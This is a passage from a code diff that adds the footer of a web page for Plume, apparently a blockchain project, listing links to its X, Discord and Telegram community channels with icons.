+                                <img src="/img/x.png" alt="X Logo" class="icon"> Plume
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://x.com/plumefndn">
+                                <img src="/img/x.png" alt="X Logo" class="icon"> Plume Foundation
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://discord.com/invite/plume-network">
+                                <img src="/img/discord.png" alt="Discord Logo" class="icon"> Discord
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://t.me/plumenetwork_community">
+                                <img src="/img/telegram.webp" alt="Telegram Logo" class="icon"> Telegram
+                            </a>
+                        </li>
+                    </ul>
+                </div>                
+            </div>
+        </div>
+    </footer>
+    
+</body>
+</html>
